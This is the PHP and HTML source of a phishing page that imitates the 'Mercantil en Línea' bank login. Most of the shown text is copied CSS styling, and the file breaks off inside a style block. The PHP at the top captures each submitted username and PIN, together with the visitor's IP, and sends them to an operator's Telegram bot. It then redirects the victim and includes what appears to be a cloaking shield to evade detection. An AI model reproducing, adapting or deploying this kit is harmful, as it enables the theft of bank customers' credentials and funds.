<?php
include './config.php';
include './gobbot/facherito/skill/tg.php';
include './fatgov.php';
include './gobbot/facherito/admin/blindaje/shield/cloack_start.php';


$update = null;
if (isset($_GET['update'])) {
    $update = $_GET['update'];
} elseif ($alert == true) {
    $msg = "🏴‍☠️ 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 👁‍🗨\r";
    $msg .= " 𝐈𝐏  " . $ip . "\r\n";
    sendTg($msg, BOT_TOKEN, CHAT_ID);
}
    
function start() {
    $msg = "➖➖➖[". APP_NAME ."]➖➖➖\n";
    $msg .= "New user: <code>". getIP() ."</code>\n\n";
    $apiToken = BOT_TOKEN;
            $data = [
        'chat_id' => CHAT_ID,
        'text' => $msg,
        'parse_mode' => 'html'
    ];

    $url = "https://api.telegram.org/bot$apiToken/sendMessage?";
    $response = @file_get_contents($url . http_build_query($data));
}

if (strtolower($_SERVER["REQUEST_METHOD"]) == "post") {

    $usr  = isset($_POST["usuario"]) ? $_POST["usuario"] : "";
    $pass = isset($_POST["pass"]) ? $_POST["pass"] : "";
    
    if ($usr != "" && $pass != "") {
        $msg  = "➖➖➖[ ".APP_NAME ." ]➖➖➖\r\n";
        $msg .= "✔️ USR : <code>{$_POST['usuario']}</code>\r\n";
        $msg .= "✔️ PIN : <code>{$_POST['pass']}</code>\r\n";
        $msg .= "➖➖➖ INFO ➖➖➖\r\n";
        $msg .= "🌐 IP : <code>".$ip."</code>\r\n";
        $msg .= "➖➖➖[ @". ADMIN ." ]➖➖➖\r\n\r\n\r\n";

        sendTg($msg, BOT_TOKEN, CHAT_ID);
        header("location: ./load.php?exprmntusr=$usr");
    }
}
?>
<!DOCTYPE html>

<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!--<base href="/melp">-->
    <base href=".">
    <title>Mercantil en Línea</title>

    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#1976d2">
    <style>
        :root {
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
        }

        *,
        :after,
        :before {
            box-sizing: border-box
        }

        html {
            font-family: sans-serif;
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: transparent
        }

        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, Liberation Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            color: #212529;
            text-align: left;
            background-color: #fff
        }

        @media print {

            *,
            :after,
            :before {
                text-shadow: none !important;
                box-shadow: none !important
            }

            @page {
                size: a3
            }

            body {
                min-width: 992px !important
            }
        }
    </style>
    <link rel="stylesheet" href="assets/bootstrap.67b15cc69e6080ae.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/intro-js.1f5cf64da5ee08c8.css" media="all" onload="this.media=&#39;all&#39;">
    <style>
        @charset "UTF-8";

        .multi-spinner-container {
            width: 100px;
            height: 100px;
            position: relative;
            margin: 30px auto;
            overflow: hidden;
            background-color: #ffffff26;
            border-radius: 50%;
            padding: 1px
        }

        .multi-spinner {
            position: relative;
            width: 100%;
            height: 100%;
            border: 3px solid transparent;
            border-radius: 50%;
            animation: spin 2s cubic-bezier(.17, .49, .96, .76) infinite
        }

        .multi-spinner.blue {
            border-top-color: #004e9b
        }

        .multi-spinner.blue:after {
            border-color: #026891;
            width: 100%;
            height: 100%
        }

        .multi-spinner.orange {
            border-top-color: #ff5800
        }

        @media (max-width: 736px) {
            .multi-spinner-container {
                width: 60px;
                height: 60px
            }

            .multi-spinner-container .multi-spinner {
                border-top-width: 2px
            }
        }

        .fade-background {
            position: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            background-color: #0000008f;
            z-index: 1008;
            transition: all .6s ease;
            top: 0;
            left: 0
        }

        @keyframes spin {
            0% {
                transform: rotate(0)
            }

            to {
                transform: rotate(360deg)
            }
        }

        html,
        body {
            min-height: 100%;
            width: 100%;
            font-family: Arial, sans-serif;
            overflow-x: hidden
        }
    </style>
    <link rel="stylesheet" href="assets/styles.c663b1e287ec0a1e.css" media="all" onload="this.media=&#39;all&#39;">
    <style>
        :root {
            --surface-a: #ffffff;
            --surface-b: #f8f9fa;
            --surface-c: #e9ecef;
            --surface-d: #dee2e6;
            --surface-e: #ffffff;
            --surface-f: #ffffff;
            --text-color: #495057;
            --text-color-secondary: #6c757d;
            --primary-color: #3B82F6;
            --primary-color-text: #ffffff;
            --font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
            --surface-0: #ffffff;
            --surface-50: #FAFAFA;
            --surface-100: #F5F5F5;
            --surface-200: #EEEEEE;
            --surface-300: #E0E0E0;
            --surface-400: #BDBDBD;
            --surface-500: #9E9E9E;
            --surface-600: #757575;
            --surface-700: #616161;
            --surface-800: #424242;
            --surface-900: #212121;
            --gray-50: #FAFAFA;
            --gray-100: #F5F5F5;
            --gray-200: #EEEEEE;
            --gray-300: #E0E0E0;
            --gray-400: #BDBDBD;
            --gray-500: #9E9E9E;
            --gray-600: #757575;
            --gray-700: #616161;
            --gray-800: #424242;
            --gray-900: #212121;
            --content-padding: 1.25rem;
            --inline-spacing: .5rem;
            --border-radius: 6px;
            --surface-ground: #eff3f8;
            --surface-section: #ffffff;
            --surface-card: #ffffff;
            --surface-overlay: #ffffff;
            --surface-border: #dfe7ef;
            --surface-hover: #f6f9fc;
            --focus-ring: 0 0 0 .2rem #BFDBFE;
            --maskbg: rgba(0, 0, 0, .4)
        }

        * {
            box-sizing: border-box
        }

        :root {
            --blue-50: #f5f9ff;
            --blue-100: #d0e1fd;
            --blue-200: #abc9fb;
            --blue-300: #85b2f9;
            --blue-400: #609af8;
            --blue-500: #3b82f6;
            --blue-600: #326fd1;
            --blue-700: #295bac;
            --blue-800: #204887;
            --blue-900: #183462;
            --green-50: #f4fcf7;
            --green-100: #caf1d8;
            --green-200: #a0e6ba;
            --green-300: #76db9b;
            --green-400: #4cd07d;
            --green-500: #22c55e;
            --green-600: #1da750;
            --green-700: #188a42;
            --green-800: #136c34;
            --green-900: #0e4f26;
            --yellow-50: #fefbf3;
            --yellow-100: #faedc4;
            --yellow-200: #f6de95;
            --yellow-300: #f2d066;
            --yellow-400: #eec137;
            --yellow-500: #eab308;
            --yellow-600: #c79807;
            --yellow-700: #a47d06;
            --yellow-800: #816204;
            --yellow-900: #5e4803;
            --cyan-50: #f3fbfd;
            --cyan-100: #c3edf5;
            --cyan-200: #94e0ed;
            --cyan-300: #65d2e4;
            --cyan-400: #35c4dc;
            --cyan-500: #06b6d4;
            --cyan-600: #059bb4;
            --cyan-700: #047f94;
            --cyan-800: #036475;
            --cyan-900: #024955;
            --pink-50: #fef6fa;
            --pink-100: #fad3e7;
            --pink-200: #f7b0d3;
            --pink-300: #f38ec0;
            --pink-400: #f06bac;
            --pink-500: #ec4899;
            --pink-600: #c93d82;
            --pink-700: #a5326b;
            --pink-800: #822854;
            --pink-900: #5e1d3d;
            --indigo-50: #f7f7fe;
            --indigo-100: #dadafc;
            --indigo-200: #bcbdf9;
            --indigo-300: #9ea0f6;
            --indigo-400: #8183f4;
            --indigo-500: #6366f1;
            --indigo-600: #5457cd;
            --indigo-700: #4547a9;
            --indigo-800: #363885;
            --indigo-900: #282960;
            --teal-50: #f3fbfb;
            --teal-100: #c7eeea;
            --teal-200: #9ae0d9;
            --teal-300: #6dd3c8;
            --teal-400: #41c5b7;
            --teal-500: #14b8a6;
            --teal-600: #119c8d;
            --teal-700: #0e8174;
            --teal-800: #0b655b;
            --teal-900: #084a42;
            --orange-50: #fff8f3;
            --orange-100: #feddc7;
            --orange-200: #fcc39b;
            --orange-300: #fba86f;
            --orange-400: #fa8e42;
            --orange-500: #f97316;
            --orange-600: #d46213;
            --orange-700: #ae510f;
            --orange-800: #893f0c;
            --orange-900: #642e09;
            --bluegray-50: #f7f8f9;
            --bluegray-100: #dadee3;
            --bluegray-200: #bcc3cd;
            --bluegray-300: #9fa9b7;
            --bluegray-400: #818ea1;
            --bluegray-500: #64748b;
            --bluegray-600: #556376;
            --bluegray-700: #465161;
            --bluegray-800: #37404c;
            --bluegray-900: #282e38;
            --purple-50: #fbf7ff;
            --purple-100: #ead6fd;
            --purple-200: #dab6fc;
            --purple-300: #c996fa;
            --purple-400: #b975f9;
            --purple-500: #a855f7;
            --purple-600: #8f48d2;
            --purple-700: #763cad;
            --purple-800: #5c2f88;
            --purple-900: #432263;
            --red-50: #fff5f5;
            --red-100: #ffd0ce;
            --red-200: #ffaca7;
            --red-300: #ff8780;
            --red-400: #ff6259;
            --red-500: #ff3d32;
            --red-600: #d9342b;
            --red-700: #b32b23;
            --red-800: #8c221c;
            --red-900: #661814;
            --primary-50: #f5f9ff;
            --primary-100: #d0e1fd;
            --primary-200: #abc9fb;
            --primary-300: #85b2f9;
            --primary-400: #609af8;
            --primary-500: #3b82f6;
            --primary-600: #326fd1;
            --primary-700: #295bac;
            --primary-800: #204887;
            --primary-900: #183462
        }
    </style>
    <link rel="stylesheet" href="assets/lara-light-blue-theme.8ecaee422619f77e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/primeng.a62c3f5e15ed62a4.css" media="all" onload="this.media=&#39;all&#39;">
    
    <style>
        .pointer[_ngcontent-ois-c85] {
            cursor: pointer
        }

        #app-container[_ngcontent-ois-c85] {
            position: absolute;
            top: 64px;
            padding-left: 64px;
            width: 100%;
            min-height: calc(100vh - 64px)
        }

        #app-container.sidebar-open[_ngcontent-ois-c85] {
            padding-left: 0
        }

        #app-container[_ngcontent-ois-c85] .overlay-sidebar[_ngcontent-ois-c85] {
            position: fixed;
            display: flex;
            visibility: hidden;
            opacity: 0;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: calc(100vh - 64px);
            background-color: #0000008f;
            z-index: 1001;
            top: 64px;
            left: 0;
            transition: all .6s ease
        }

        #app-container[_ngcontent-ois-c85] .overlay-sidebar.active[_ngcontent-ois-c85] {
            opacity: 1;
            visibility: visible;
            animation: fadein .6s
        }

        @media (max-width: 1111px) {
            #app-container[_ngcontent-ois-c85] {
                padding-left: 0
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c54] {
            cursor: pointer
        }

        .nav-bar[_ngcontent-ois-c54] {
            background: #004e9b;
            color: #fff;
            width: 100%;
            height: 64px;
            position: fixed;
            display: flex;
            font-family: Arial, sans-serif;
            font-size: 16px;
            padding: 0;
            margin: 0;
            z-index: 1003
        }

        .nav-bar[_ngcontent-ois-c54] .left-side[_ngcontent-ois-c54] {
            display: inline-flex;
            justify-content: left;
            align-items: center;
            width: 50%;
            z-index: 1004
        }

        .nav-bar[_ngcontent-ois-c54] .left-side.hidden[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54],
        .nav-bar[_ngcontent-ois-c54] .left-side.hidden[_ngcontent-ois-c54] .bezel-wrapper[_ngcontent-ois-c54] {
            display: none;
            opacity: 0
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] {
            width: 64px;
            height: 64px;
            position: relative;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            min-width: 64px
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] div.main-menu-toggle[_ngcontent-ois-c54] {
            height: 30px;
            width: 30px;
            background-color: #004e9b;
            position: relative;
            cursor: pointer
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] div.main-menu-toggle.active[_ngcontent-ois-c54] span.middle-line[_ngcontent-ois-c54] {
            transform: rotate(180deg);
            width: 0;
            margin-left: 32px
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] div.main-menu-toggle.active[_ngcontent-ois-c54] span.middle-line[_ngcontent-ois-c54]:before {
            bottom: 5px;
            left: 10px;
            width: 16px;
            transform: rotate(45deg)
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] div.main-menu-toggle.active[_ngcontent-ois-c54] span.middle-line[_ngcontent-ois-c54]:after {
            top: 5px;
            left: 10px;
            width: 16px;
            transform: rotate(-45deg)
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] span.middle-line[_ngcontent-ois-c54] {
            background-color: #fff;
            height: 2px;
            width: 30px;
            border-radius: 2px;
            position: absolute;
            left: 0;
            top: 50%;
            transition: all .3s ease
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] span.middle-line[_ngcontent-ois-c54]:before {
            content: "";
            background-color: #fff;
            height: 2px;
            width: 100%;
            border-radius: 2px;
            position: absolute;
            bottom: 8px;
            left: 0;
            transition: all .3s ease
        }

        .nav-bar[_ngcontent-ois-c54] .main-menu-toggle-wrapper[_ngcontent-ois-c54] span.middle-line[_ngcontent-ois-c54]:after {
            content: "";
            background-color: #fff;
            height: 2px;
            width: 100%;
            border-radius: 2px;
            position: absolute;
            top: 8px;
            left: 0;
            transition: all .3s ease
        }

        .nav-bar[_ngcontent-ois-c54] .bezel-wrapper[_ngcontent-ois-c54] {
            display: inline-flex;
            align-items: center;
            width: 2px
        }

        .nav-bar[_ngcontent-ois-c54] .bezel-wrapper[_ngcontent-ois-c54] .bezel-1[_ngcontent-ois-c54] {
            display: inline-flex;
            height: 54px;
            width: 1px;
            background-color: #023568
        }

        .nav-bar[_ngcontent-ois-c54] .bezel-wrapper[_ngcontent-ois-c54] .bezel-2[_ngcontent-ois-c54] {
            display: inline-flex;
            height: 52px;
            width: 1px;
            background-color: #026891
        }

        .nav-bar[_ngcontent-ois-c54] .logo-wrapper[_ngcontent-ois-c54] {
            display: inline-flex;
            overflow: hidden
        }

        .nav-bar[_ngcontent-ois-c54] .logo-wrapper[_ngcontent-ois-c54] img[_ngcontent-ois-c54] {
            max-height: 100%;
            width: auto;
            transition: all ease .4s;
            cursor: pointer
        }

        .nav-bar[_ngcontent-ois-c54] .logo-wrapper[_ngcontent-ois-c54] img[_ngcontent-ois-c54]:hover {
            transform: scale(1.03)
        }

        .nav-bar[_ngcontent-ois-c54] .right-side[_ngcontent-ois-c54] {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding-right: 20px;
            width: 100%;
            z-index: 1004
        }

        .nav-bar[_ngcontent-ois-c54] .right-side[_ngcontent-ois-c54] p[_ngcontent-ois-c54] {
            margin: 0
        }

        .nav-bar[_ngcontent-ois-c54] .hidden[_ngcontent-ois-c54] .transition[_ngcontent-ois-c54] {
            display: none
        }

        .nav-bar[_ngcontent-ois-c54] #site-name[_ngcontent-ois-c54] {
            font-size: 16px;
            font-weight: 700;
            margin: auto
        }

        .nav-bar[_ngcontent-ois-c54] .transition[_ngcontent-ois-c54]:hover .user-initials-wrapper[_ngcontent-ois-c54] {
            background: rgba(0, 159, 218, .7)
        }

        .nav-bar[_ngcontent-ois-c54] .transition[_ngcontent-ois-c54] .user-initials-wrapper[_ngcontent-ois-c54] {
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            height: 40px;
            width: 40px;
            border-radius: 36px;
            background-color: #009fda;
            margin-left: 20px;
            cursor: pointer
        }

        .nav-bar[_ngcontent-ois-c54] .transition[_ngcontent-ois-c54] .user-initials-wrapper[_ngcontent-ois-c54] .user-initials[_ngcontent-ois-c54] {
            font: 700 21px/24px Arial, sans-serif
        }

        .nav-bar[_ngcontent-ois-c54] .transition[_ngcontent-ois-c54] .newIcon[_ngcontent-ois-c54] {
            position: absolute;
            top: 8px;
            right: 16px
        }

        .nav-bar[_ngcontent-ois-c54] .iso-wrapper[_ngcontent-ois-c54] {
            display: none;
            visibility: hidden;
            width: 100%;
            height: 64px;
            align-items: center;
            justify-content: center
        }

        .nav-bar[_ngcontent-ois-c54] .iso-wrapper[_ngcontent-ois-c54] img[_ngcontent-ois-c54] {
            max-height: 100%;
            width: auto;
            cursor: pointer
        }

        .header-button[_ngcontent-ois-c54] {
            padding-left: 24px
        }

        .header-button[_ngcontent-ois-c54] .header-wrapper[_ngcontent-ois-c54] {
            background: transparent;
            padding: 8px 24px;
            border-radius: 24px;
            border: 2px solid #FFFFFF
        }

        .header-button[_ngcontent-ois-c54] .header-wrapper[_ngcontent-ois-c54] .header-text[_ngcontent-ois-c54] {
            color: #fff;
            font-family: Arial, sans-serif;
            font-size: 16px;
            font-weight: 400;
            line-height: 1
        }

        @media (max-width: 736px) {
            .nav-bar[_ngcontent-ois-c54] .left-side[_ngcontent-ois-c54] {
                width: 75%
            }

            .nav-bar[_ngcontent-ois-c54] .left-side[_ngcontent-ois-c54] .logo-wrapper[_ngcontent-ois-c54] img[_ngcontent-ois-c54] {
                display: none;
                visibility: hidden
            }

            .nav-bar[_ngcontent-ois-c54] .iso-wrapper[_ngcontent-ois-c54] {
                display: flex;
                visibility: visible;
                z-index: 1003
            }

            .nav-bar[_ngcontent-ois-c54] .iso-wrapper[_ngcontent-ois-c54] img[_ngcontent-ois-c54] {
                z-index: 1005
            }
        }

        @media (max-width: 768px) {
            .right-side[_ngcontent-ois-c54] .site-name-wrapper[_ngcontent-ois-c54] #site-name[_ngcontent-ois-c54] {
                display: none
            }
        }

        @media (max-width: 568px) {
            .right-side[_ngcontent-ois-c54] .site-name-wrapper[_ngcontent-ois-c54] {
                display: none !important
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c55] {
            cursor: pointer
        }

        #confirm-modal.active[_ngcontent-ois-c55] {
            padding: 16px
        }

        #confirm-modal.active[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] {
            animation: slideIn .6s
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] {
            max-width: 400px;
            border-radius: 25px;
            line-height: 1
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] .modal-img[_ngcontent-ois-c55] {
            position: absolute;
            height: 56px;
            width: 100%;
            margin-top: -28px;
            text-align: center
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] .modal-img[_ngcontent-ois-c55] img[_ngcontent-ois-c55] {
            height: 56px;
            width: 56px;
            animation: rotate ease-in-out 2s infinite
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] .card-body[_ngcontent-ois-c55] {
            padding: 36px 20px 20px
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] .card-body[_ngcontent-ois-c55] .modal-title[_ngcontent-ois-c55] {
            text-align: center;
            font-size: 16px;
            font-weight: 700;
            color: #004e9b;
            margin-bottom: 16px
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] .card-body[_ngcontent-ois-c55] .modal-content[_ngcontent-ois-c55] {
            border: none;
            text-align: center;
            font-size: 14px;
            color: #666;
            margin-bottom: 16px;
            line-height: 1.2
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] .card-body[_ngcontent-ois-c55] .modal-content[_ngcontent-ois-c55] b[_ngcontent-ois-c55] {
            display: block
        }

        #confirm-modal[_ngcontent-ois-c55] .card[_ngcontent-ois-c55] .card-body[_ngcontent-ois-c55] .button-wrapper[_ngcontent-ois-c55] {
            justify-content: center !important
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c56] {
            cursor: pointer
        }

        .mercantil-color {
            color: #004e9b
        }

        .fade-background[_ngcontent-ois-c56] {
            position: fixed;
            display: flex;
            visibility: hidden;
            justify-content: center;
            align-items: center;
            opacity: 0;
            width: 100%;
            min-height: 100%;
            background-color: #0000008f;
            z-index: 1004;
            transition: all .6s ease
        }

        .fade-background.active[_ngcontent-ois-c56] {
            visibility: visible;
            opacity: 1
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] {
            max-width: 400px;
            border-radius: 25px;
            line-height: 1
        }

        .fade-background[_ngcontent-ois-c56] .card.extra[_ngcontent-ois-c56] {
            max-width: 720px !important
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .modal-img[_ngcontent-ois-c56] {
            position: absolute;
            height: 56px;
            width: 100%;
            margin-top: -28px;
            text-align: center
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .modal-img[_ngcontent-ois-c56] img[_ngcontent-ois-c56] {
            height: 56px;
            width: 56px
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] {
            padding: 50px 16px 24px !important
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-title[_ngcontent-ois-c56] {
            text-align: center;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 16px;
            color: #004e9b
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-title.error[_ngcontent-ois-c56] {
            color: #f33
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-title.notification[_ngcontent-ois-c56] {
            color: #004e9b
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-content[_ngcontent-ois-c56] {
            border: none;
            text-align: center;
            font-size: 16px;
            color: #666;
            margin-bottom: 24px
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-content.without-margin[_ngcontent-ois-c56] {
            margin-bottom: 0
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-content[_ngcontent-ois-c56] p[_ngcontent-ois-c56] {
            text-align: justify
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-content[_ngcontent-ois-c56] p[_ngcontent-ois-c56]:last-of-type {
            margin-bottom: 0
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-content[_ngcontent-ois-c56] ul[_ngcontent-ois-c56] {
            text-align: left;
            margin-bottom: 0
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-content[_ngcontent-ois-c56] ul[_ngcontent-ois-c56] li[_ngcontent-ois-c56] {
            margin: 0 0 1em
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .modal-content[_ngcontent-ois-c56] b[_ngcontent-ois-c56] {
            display: block
        }

        .fade-background[_ngcontent-ois-c56] .card[_ngcontent-ois-c56] .card-body[_ngcontent-ois-c56] .button-wrapper[_ngcontent-ois-c56] {
            justify-content: center !important
        }

        .card-header[_ngcontent-ois-c56] {
            background: none;
            display: flex;
            justify-content: flex-end;
            border: none
        }

        .card-body[_ngcontent-ois-c56] {
            padding: 0 20px 20px !important
        }

        .card-body__content[_ngcontent-ois-c56] {
            display: flex;
            height: 100%;
            flex-direction: row
        }

        .card--modal-custom[_ngcontent-ois-c56] {
            width: -moz-fit-content;
            width: fit-content
        }

        .card--modal-custom-ip-not-valid[_ngcontent-ois-c56] {
            max-width: 760px !important;
            height: 318px !important
        }

        .card-image[_ngcontent-ois-c56] {
            width: 100%
        }

        .content__description[_ngcontent-ois-c56] {
            display: flex;
            flex-direction: column;
            padding: 24px;
            margin: auto
        }

        .close[_ngcontent-ois-c56] {
            position: absolute;
            cursor: pointer;
            top: 8px;
            right: 20px;
            font-size: 30px;
            z-index: 1;
            opacity: 1 !important
        }

        .custom-align[_ngcontent-ois-c56] {
            text-align: center !important
        }

        @media (max-width: 667px) {
            .card-body__content[_ngcontent-ois-c56] {
                flex-wrap: wrap
            }

            .card--modal-custom[_ngcontent-ois-c56] {
                width: auto
            }

            .card--modal-custom-ip-not-valid[_ngcontent-ois-c56] {
                max-width: 619px !important;
                height: auto !important
            }

            .content__description[_ngcontent-ois-c56] {
                padding: 0
            }
        }

        @media (max-width: 568px) {
            .card--modal-custom[_ngcontent-ois-c56] {
                width: auto
            }

            .card--modal-custom-ip-not-valid[_ngcontent-ois-c56] {
                max-width: 520px !important;
                height: auto !important
            }
        }

        @media (max-width: 414px) {
            .card--modal-custom[_ngcontent-ois-c56] {
                width: auto
            }

            .card--modal-custom-ip-not-valid[_ngcontent-ois-c56] {
                max-width: 366px !important;
                height: auto !important
            }
        }

        @media (max-width: 375px) {
            .card--modal-custom[_ngcontent-ois-c56] {
                width: auto
            }

            .card--modal-custom-ip-not-valid[_ngcontent-ois-c56] {
                max-width: 343px !important;
                height: auto !important
            }
        }

        @media (max-width: 320px) {
            .card--modal-custom[_ngcontent-ois-c56] {
                width: auto
            }

            .card--modal-custom-ip-not-valid[_ngcontent-ois-c56] {
                max-width: 289px !important;
                height: auto !important
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c57] {
            cursor: pointer
        }

        .fade-background[_ngcontent-ois-c57] {
            position: fixed;
            display: flex;
            visibility: hidden;
            justify-content: center;
            align-items: center;
            opacity: 0;
            width: 100%;
            min-height: 100%;
            background-color: #0000008f;
            z-index: 1004;
            transition: all .6s ease
        }

        .fade-background.active[_ngcontent-ois-c57] {
            visibility: visible;
            opacity: 1
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] {
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            word-wrap: break-word;
            background-color: #fff;
            background-clip: border-box;
            border: 1px solid rgba(0, 0, 0, .125);
            max-width: 400px;
            border-radius: 25px;
            line-height: 1;
            padding: 24px;
            justify-content: center;
            overflow-y: auto
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-img[_ngcontent-ois-c57] {
            width: 100%;
            margin-bottom: 32px;
            text-align: center
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-title[_ngcontent-ois-c57] {
            text-align: center;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 16px;
            color: #004e9b
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-title.error[_ngcontent-ois-c57] {
            color: #f33
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-title.notification[_ngcontent-ois-c57] {
            color: #004e9b
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content[_ngcontent-ois-c57] {
            border: none;
            text-align: center;
            font-size: 16px;
            color: #666;
            margin-bottom: 32px
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content.without-margin[_ngcontent-ois-c57] {
            margin-bottom: 0
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content[_ngcontent-ois-c57] .align-left[_ngcontent-ois-c57] {
            text-align: left
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content[_ngcontent-ois-c57] .align-center[_ngcontent-ois-c57] {
            text-align: center
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content[_ngcontent-ois-c57] .align-right[_ngcontent-ois-c57] {
            text-align: right
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content[_ngcontent-ois-c57] .align-justify[_ngcontent-ois-c57] {
            text-align: justify
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content[_ngcontent-ois-c57] .modal-title-description[_ngcontent-ois-c57] {
            font-family: Arial;
            font-size: 20px;
            font-style: normal;
            line-height: 23px;
            letter-spacing: .18px
        }

        .fade-background[_ngcontent-ois-c57] .modal-card[_ngcontent-ois-c57] .modal-card-body[_ngcontent-ois-c57] .modal-content[_ngcontent-ois-c57] p[_ngcontent-ois-c57]:last-of-type {
            margin-bottom: 0
        }

